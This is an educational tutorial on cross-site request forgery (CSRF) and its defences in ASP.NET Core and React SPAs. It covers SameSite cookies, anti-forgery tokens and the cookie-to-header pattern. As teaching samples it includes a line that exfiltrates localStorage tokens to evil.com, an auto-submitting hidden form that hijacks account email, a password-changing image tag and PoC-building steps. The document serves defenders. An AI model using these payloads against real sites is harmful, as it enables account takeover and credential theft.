# CSRF

# CSRF Mastery: The "Sleepy" Giant

## Curriculum Syllabus

### Phase 0: Storage Fundamentals (The Prerequisite)

1. **The Cookie Behavior**: Automatic sending, Domain Scoping, and the "HttpOnly" shield.
2. **Local vs Session Storage**: Use cases, "Passive" nature, and why XSS loves them.
3. **The Trade-off Matrix**: Secure vs Convenient storage for Secrets.

### Phase 1: The Mechanic (The Confused Deputy)

1. **Definition**: What is "Session Riding" and why does the browser send cookies automatically?
2. **The Anatomy**: Dissecting a standard CSRF attack (The Hidden Form).
3. **XSS vs CSRF**: Why XSS defeats all CSRF defenses (The "Open Door" principle).
4. **The Impact**: State changing actions vs Data Theft (Can CSRF read data?).
5. **Pre-Authentication CSRF (Login CSRF)**: Forcing a victim to log in as *you*.

### Phase 2: The Attack Surface (Verbs & APIs)

1. **GET vs POST**: Why `[HttpGet] ChangePassword()` is a deadly sin.
2. **JSON APIs**: Are pure JSON APIs (Content-Type: application/json) naturally immune?
3. **CORS & CSRF**: The misunderstanding. Does CORS stop CSRF? (Spoiler: No).
4. **Referer/Origin Checks**: Why checking headers is a "Defense in Depth" strategy, not a fix.

### Phase 3: The Shield (Defenses)

1. **Synchronizer Token Pattern (Anti-Forgery Tokens)**: How [ASP.NET](http://asp.net/) Core's `@Html.AntiForgeryToken()` actually works.
2. **Double Submit Cookie**: The stateless alternative for SPAs.
3. **SameSite Cookies (Lax)**: The modern browser default. Is it enough?
4. **SameSite Cookies (Strict)**: When to use it, and how it impacts UX (Deep Linking).
5. **SameSite (None)**: The "Iframe" trap and `Secure` flag requirement.

### Phase 4: Modern Warfare (SPAs & Architecture)

1. **SPA Defense (React/Angular)**: Where do I store the Token? (Cookie vs LocalStorage).
2. **The "Cookie-to-Header" Pattern**: The industry standard for securing APIs.
3. **Per-Session vs Per-Request Tokens**: Balancing security and usability.
4. **Testing Tools**: How to effectively generate CSRF PoCs using Burp Suite or simple HTML.

---

---

## Phase 0: Storage Fundamentals (The Prerequisite)

*Goal: Understand where to store secrets before we try to protect them.*

### 1. The Cookie Behavior

**Q: How does a Cookie actually work?**

- **The "Active" Nature:**
Cookies are the **ONLY** storage mechanism that the browser *automatically* sends to the server.
    - You set it once: `Set-Cookie: user=123`
    - Browser sends it properly: `Cookie: user=123`
    - Browser sends it "improperly" (CSRF): `Cookie: user=123` (even if the request wasn't triggered by your UI).
- **Attributes of Control:**
    - `HttpOnly`: **Critical.** JS cannot read it (`document.cookie` returns empty). Prevents XSS theft.
    - `Secure`: Only sent over HTTPS.
    - `SameSite`: Controls if it is sent on cross-site requests (The CSRF defense).

### 2. Local vs Session Storage

**Q: Why not just store everything here?**

- **The "Passive" Nature:**
Data in `localStorage.getItem('token')` just sits there.
The browser **NEVER** sends it automatically.
    - **Pro:** Immune to CSRF. (Attacker creates a Form -> Browser sends Form -> Browser does NOT attach LocalStorage).
    - **Con:** You must write JS to read it and put it in a Header.
- **The Security Risk (XSS):**
LocalStorage is **Always Accessible** to JavaScript.
    - If you have an XSS bug, attacker runs: `fetch('<http://evil.com?data=>' + localStorage.getItem('token'))`.
    - **Game Over.** There is no "HttpOnly" flag for LocalStorage.

### 3. The Trade-off Matrix (The Secrets Guide)

**Q: So where do I put the JWT / Session ID?**

| Feature | HttpOnly Cookie | LocalStorage |
| --- | --- | --- |
| **XSS Vulnerable?** | **NO** (Cannot be read by JS) | **YES** (Trivial to steal) |
| **CSRF Vulnerable?** | **YES** (Auto-sent by browser) | **NO** (Never auto-sent) |
| **Default Choice?** | **RECOMMENDED** for Sessions | **Avoid** for Secrets |
- **The "Golden Rule":**
    - Store **Identity** (Session ID) in **HttpOnly Cookies** (Fixes XSS, but introduces CSRF risk -> Fix CSRF with Tokens).
    - Store **UI Preference** (Theme=Dark) in **LocalStorage**.

---

## Phase 1: The Mechanic (The Confused Deputy)

*Goal: Understand that the browser is "too helpful". It attaches cookies to requests effectively "signing" them as you, even if you didn't initiate the request.*

### 1. Definition & Mechanics

**Q: What is "Session Riding" and why does the browser send cookies automatically?**

- **The Deep Dive:**
When you log in to `bank.com`, the server gives you a Session Cookie (`SessionId=abc`).
For every subsequent request to `bank.com`, the browser *automatically* attaches `SessionId=abc`.
**Vulnerability:** This happens even if the request comes from an image on `evil.com`. The browser sees the destination is `bank.com` and helpfully attaches the credential.
- **Vulnerable Scenario:**
You are logged into `bank.com`.
You visit `evil.com`.
`evil.com` -> Requests `bank.com/transfer`.
Browser -> Attaches `SessionId=abc`.
`bank.com` -> "Credentials look good. Transfer approved."

---

### 2. The Anatomy

**Q: Dissecting a standard CSRF attack (The Hidden Form).**

- **The Scenario:**
A simple "Change Email" form on your social media profile.
- **Vulnerable Code (Controller):**
    
    ```csharp
    [HttpPost]
    public IActionResult UpdateEmail(string newEmail)
    {
        // Vulnerable: Checks Cookie (Implicit), but no Unique Token
        var user = GetCurrentUser();
        user.Email = newEmail;
        _db.SaveChanges();
        return Ok();
    }
    
    ```
    
- **The Attack (On [evil.com](http://evil.com/)):**
    
    ```html
    <!-- Invisible Form -->
    <form action="<https://yoursite.com/account/UpdateEmail>" method="POST" id="hack">
        <input type="hidden" name="newEmail" value="hacker@evil.com">
    </form>
    <script>
        // Auto-submit on page load
        document.getElementById("hack").submit();
    </script>
    
    ```
    
- **Mechanism:**
User visits `evil.com`. The form POSTs to `yoursite.com`. Cookies travel with it. Email is changed to attacker's email. Attacker clicks "Forgot Password" and takes over account.

---

### 3. XSS vs CSRF

**Q: Why XSS defeats all CSRF defenses (The "Open Door" principle).**

- **The Concept:**
CSRF is "Blind". I can send a command, but I cannot read the response (SOP blocks me).
XSS has "Eyes". I can read the response.
- **The Implication:**
If you have an XSS vulnerability, **CSRF protection is useless**.
- **The Attack:**
XSS Script:
    1. Request the Form (`GET /account/manage`).
    2. Read the Anti-Forgery Token from the response HTML.
    3. Send the POST request with the valid Token.
- **Rule:** Fix XSS first. CSRF tokens cannot stop an attacker who runs script on your domain.

---

### 4. The Impact

**Q: State changing actions vs Data Theft (Can CSRF read data?).**

- **The Myth:** "CSRF can steal my bank statement."
- **The Reality:**
CSRF is **Write-Only**.
    - Attacker can: Change Password, Transfer Money, Delete Account.
    - Attacker *cannot*: Read your email, See your balance.
    - *Reason:* The Browser (SOP) prevents `evil.com` from reading the response of `bank.com`.
- **Exception:JSON Hijacking** (Old vulnerability, mostly fixed in modern browsers) allowed reading JSON arrays. Today, CSRF is strictly for *doing* things, not *seeing* things.

---

### 5. Pre-Authentication CSRF (Login CSRF)

**Q: Forcing a victim to log in as *you*.**

- **The Scenario:**
Attacker creates a `Google` account/`Paypal` account.
Attacker tricks Victim into logging in as the *Attacker*.
- **The Attack:**
    1. `evil.com` auto-submits a login form to `google.com` with `User=Attacker` / `Pass=123`.
    2. Victim is now logged in as Attacker.
    3. Victim searches for sensitive things (Medical history, etc.).
    4. Attacker logs into their own account implies -> "Oh, look at this search history I have."
- **Defense:**
Anti-Forgery Tokens on **Login Forms** too. (Many sites skip this, which is a mistake).

---

### 6. GET vs POST

**Q: Why `[HttpGet] ChangePassword()` is a deadly sin.**

- **The Problem:**
If a sensitive action (like changing a password) is triggered by a `GET` request, it's trivial to embed it in an image tag or a simple link.
`<img src="<https://yoursite.com/account/ChangePassword?newPass=hacker>">`
- **The Fix:NEVER** use `GET` for state-changing operations. Always use `POST` (or `PUT`/`DELETE`).
This forces the attacker to use a `<form>` tag, which is still vulnerable to CSRF, but at least it's not a one-liner.

---

### 7. JSON APIs

**Q: Are pure JSON APIs (Content-Type: application/json) naturally immune?**

- **The Myth:** "My API only accepts `application/json`, so it's safe from CSRF."
- **The Reality:**
Older browsers (IE9 and below) could send `application/json` via a `<form>` tag.
Modern browsers (HTML5) generally default to `application/x-www-form-urlencoded` or `multipart/form-data` for forms.
However, an attacker can still craft a form that sends `text/plain` with JSON content, and some servers might parse it.
- **The Real Problem:**
Even if the `Content-Type` is wrong, the request *still* arrives at the server with the victim's cookies.
If the server is lenient in parsing, or if the attacker finds a way to force the correct `Content-Type` (e.g., via Flash or a CORS preflight bypass), it's still vulnerable.
- **Conclusion:**
Relying on `Content-Type` alone is a weak defense. Always use proper CSRF tokens.

---

### 8. CORS & CSRF

**Q: The Misunderstanding. Does CORS stop CSRF? (Spoiler: No).**

- **The Novice Confusion:**
"CORS blocks cross-origin requests, right? So `evil.com` can't call `bank.com`."
- **The Reality (The "Fire and Forget" Attack):**
CORS prevents the **Browser** from *reading* the answer. It does NOT prevent the **Server** from *receiving* the question.
    - **Analogy:**
        - **CSRF:** You shoot an arrow over the castle wall. You don't know if it hit anyone (Blind), but the arrow definitely landed.
        - **CORS:** The castle guards prevent you from seeing the damage report.
    - **Result:** The money is already transferred (Arrow landed). The attacker just doesn't get the receipt (Blocked by CORS).
- **Conclusion:**
CORS is for privacy (Data Confidentiality). It is useless for integrity (Blocking Actions).

---

### 9. Referer/Origin Checks

**Q: Why checking headers is a "Defense in Depth" strategy, not a fix.**

- **The Defense:**
Middleware checks `Request.Headers["Origin"]`.
If `Origin != <https://yoursite.com`>, Reject.
- **The Problem:**
    1. **Privacy Settings:** Corporate proxies and privacy plugins often strip the `Referer` and `Origin` headers. You will block legitimate users.
    2. **Spoofing:** While hard in browsers, relying on headers that can be omitted is risky.
- **Secure Implementation:**
Use checks as a *backup* to Tokens, not a replacement.
    
    ```csharp
    // Weak check
    if (Request.Headers["Origin"] == "null") return BadRequest();
    
    ```
    

---

## Phase 3: The Shield (Defenses)

*Goal: Breaking the trust chain. Making sure the request came from YOU, not an imposter.*

### 10. Synchronizer Token Pattern (Anti-Forgery Tokens)

**Q: How does the Server know it's really YOU, and not a hidden iframe?**

- **The Mechanics (The "Secret Handshake"):**
Imagine you are at a club.
    1. **Entry (GET):** The bouncer stamps your hand with a UV stamp (The Token).
    2. **Buying a Drink (POST):** You show your hand.
    3. **The Check:**
        - **You:** "One water please." (Shows valid UV stamp). -> **Served.**
        - **Imposter (CSRF):** "One water please." (Has no stamp, or cannot see your stamp to copy it). -> **Kicked out.**
- [**ASP.NET](http://asp.net/) Core Implementation:**
The "Stamp" is a random secret.
    - **Cookie:** Holds the encrypted secret.
    - **Form Field:** Holds the *same* secret (or a value derived from it).
    - **The Key:** The attacker can compel your browser to send the **Cookie**, but they cannot read the **Form Field** (due to SOP). The server demands **BOTH** to match.
- **Secure Code (Razor):**
    
    ```html
    <form method="post">
        @Html.AntiForgeryToken()
        <!-- Rest of form -->
    </form>
    
    ```
    
- **Secure Code (Controller):**
    
    ```csharp
    [HttpPost]
    [ValidateAntiForgeryToken] // Auto-checks the token match
    public IActionResult Save() { ... }
    
    ```
    

---

### 11. Double Submit Cookie (The Stateless SPA alternative)

**Q: I don't have `<form>` tags in React. How do I do the Handshake?**

- **The Problem:**
In Razor, the server injects the "Form Field" into the HTML before it leaves the server.
In React/Angular, the HTML is static. The server cannot "inject" a token into your `PostButton.js` component because it doesn't render it.
- **The Solution (Double Submit):**
We stop using a Form Field. We use a **Header**.
    1. Server gives you a cookie: `CsrfToken=abc`.
    2. **The Trick:** This cookie is **NOT HttpOnly**. This means your JavaScript *can* read it.
    3. When sending a POST, your JS reads the cookie `abc` and copies it into a header `X-CSRF-TOKEN: abc`.
    4. Server checks: `Cookie == Header`.
- **Why is this secure?**
    - `evil.com` can send the cookie (browser behavior).
    - `evil.com` **CANNOT** read the cookie to copy it into the header (SOP blocks reading).
    - Therefore, if the Header is present, the request *must* have come from legitimate JS running on your domain.

---

### 12. SameSite Cookies (Lax)

**Q: The modern browser default. Is it "Clicking" or "Loading"?**

- **The Technical Jargon:** "SameSite=Lax allows Top-Level Navigations but blocks Subresources." (What??)
- **The Plain English Translation:**
    - **Scenario A (The user meant to do it):**
    You are on `Evil.com`. You click a link `<a href="bank.com/dashboard">Go to Bank</a>`.
        - *Result:* The browser says "The user clicked this. They *want* to go there." -> **Cookies Sent.** (You are logged in).
    - **Scenario B (The user was tricked):**
    You are on `Evil.com`. The page has an invisible image `<img src="bank.com/transfer">`.
        - *Result:* The browser says "The user didn't click this. The page is loading it in the background." -> **Cookies Blocked.** (Request fails).
- **Defense:**`Lax` is a brilliant default because it keeps your site working (Links works) but breaks the standard CSRF attack (Hidden Images/Forms fail).
- **Gotchas:**
It does not stop GET-based CSRF if you open a new window (`window.open`). It is a great default, but not a silver bullet.

---

### 13. SameSite Cookies (Strict)

**Q: When to use it, and how it impacts UX (Deep Linking).**

- **The Config:**`Set-Cookie: SessionId=abc; SameSite=Strict`
- **Behavior:**
Cookies are **NEVER** sent if the request comes from an external URL.
- **The UX Problem:**
You send a password and reset link to a user's email: `https://site.com/reset`.
User clicks link (from Gmail).
Browser opens `site.com`. **No Cookies**. User looks logged out.
- **Use Case:**
High-security apps (Banking) where forcing a re-login on external links is acceptable.

---

### 14. SameSite (None)

**Q: The "Iframe" trap and `Secure` flag requirement.**

- **The Use Case:**
You are building a Widget (e.g., YouTube Embed, Chat Widget) meant to be IFramed on other sites.
- **The Requirement:**
You *need* cookies to work inside that IFrame (Cross-Site).
- **The Config:**`Set-Cookie: SessionId=abc; SameSite=None; Secure`
- **Risk:**
You are opting out of browser CSRF protection. You **MUST** use Anti-Forgery Tokens if you use `SameSite=None`.

---

## Phase 4: Modern Warfare (SPAs & Architecture)

*Goal: Managing CSRF in a world without `<form>` tags.*

### 15. The "Chicken and Egg" Problem (SPA Initialization)

**Q: If my React app is just static JS, how do I get the FIRST token to start the handshake?**

- **The Scenario:**
    1. User loads `index.html` (Static Asset). No Cookies/Tokens yet.
    2. User logs in via API (`POST /api/login`).
- **The Solution (The Setup Endpoint):**
Your API must have a dedicated endpoint to "plant" the seed.
    - **Option A (Login Response):**
    When `POST /api/login` succeeds, the server sets the `XSRF-TOKEN` cookie along with the `Session` cookie.
    - **Option B (Dedicated Endpoint):**
    Call `GET /api/antiforgery/token` when the app boots.
    - **Secure Code (C# Endpoint):**
        
        ```csharp
        [HttpGet("token")]
        public IActionResult GetToken([FromServices] IAntiforgery antiforgery)
        {
            var tokens = antiforgery.GetAndStoreTokens(HttpContext);
            // We manually set the cookie that JS can read
            HttpContext.Response.Cookies.Append(
                "XSRF-TOKEN",
                tokens.RequestToken,
                new CookieOptions { HttpOnly = false } // Vital: Allow JS to read!
            );
            return Ok();
        }
        
        ```
        

### 16. The "Cookie-to-Header" Implementation

**Q: How to wire up React/Angular to automatically use this token?**

- **The Mechanics:**
    1. **Read:** JS reads `document.cookie`. Finds `XSRF-TOKEN=...`.
    2. **Write:** JS adds header `X-XSRF-TOKEN` to every Axios/Fetch request.
- **React (Axios) Automagic:**
Axios has built-in support for this pattern because it's so common.
    
    ```jsx
    // api.js
    import axios from 'axios';
    
    // Tell Axios to look for "XSRF-TOKEN" cookie
    // And send it as "X-XSRF-TOKEN" header
    axios.defaults.withCredentials = true; // Send cookies
    axios.defaults.xsrfCookieName = "XSRF-TOKEN";
    axios.defaults.xsrfHeaderName = "X-XSRF-TOKEN";
    
    // Now simply call your API
    axios.post('/api/transfer', { amount: 100 });
    
    ```
    
- **The Server Side ([ASP.NET](http://asp.net/) Core):**
You need to tell [ASP.NET](http://asp.net/) to look at the **Header**, not the Form.
    
    ```csharp
    // Program.cs
    builder.Services.AddAntiforgery(options => {
        // "I expect the token in this Header"
        options.HeaderName = "X-XSRF-TOKEN";
    });
    
    ```
    

### 16.5 The Complete SPA Handshake (Visualized)

1. **Boot:** Browser loads React App.
2. **Init:** React calls `GET /api/csrf-token`.
3. **Seed:** Server responds `200 OK`. Sets Cookie `XSRF-TOKEN=123xyz`.
4. **Action:** User clicks "Delete Account".
5. **Intercept:** Axios Interceptor sees POST request.
6. **Extract:** Axios reads cookie `XSRF-TOKEN`.
7. **Attach:** Axios adds Header `X-XSRF-TOKEN: 123xyz`.
8. **Send:** Request flies to Server.
9. **Verify:** Server middleware checks: `Header["X-XSRF-TOKEN"] == Cookie["XSRF-TOKEN"]`.
10. **Result:** Match -> Allow. No Header -> `400 Bad Request`.

---

### 17. Per-Session vs Per-Request Tokens

**Q: Balancing security and usability.**

- **Per-Session (Standard):**
Token lasts until the user logs out.
*Pros:* Easy to manage, works with multiple tabs.
*Cons:* If stolen (via XSS), works forever (until logout).
- **Per-Request (High Security):**
Token changes after *every* POST.
*Pros:* Extremely secure. Replay attacks impossible.
*Cons:* breaks the "Back Button" and Multi-tab browsing usability.
- **Verdict:**
Use **Per-Session** tokens for 99% of apps. The UX cost of Per-Request is too high for the marginal gain.

---

### 18. Testing Tools

**Q: How to effectively generate CSRF PoCs using Burp Suite or simple HTML.**

- **Manual PoC Gen:**
    1. Capture a valid POST request in Chrome DevTools Network Tab.
    2. Create a local HTML file `hack.html`.
    3. Add a `<form>` replicating the parameters.
    4. Add `<script>form.submit()</script>`.
    5. Open `hack.html` while logged in.
- **Burp Suite Professional:**
Right-click request -> "Engagement Tools" -> "Generate CSRF PoC".

---

## Graduation: You are now a CSRF Architect.

You understand that "Session Riding" is why `state` parameters exist in OAuth and why `Double Submit` works.

**Final Checklist for your next PR:**

1. **Verbs:** Are use deleting data with `GET`? (Stop it).
2. **State:** Are you relying on Cookies alone? (Add a Token).
3. **SPAs:** Are you using `Cookie-to-Header`?
4. **SameSite:** Is it set to `Lax` or `Strict`?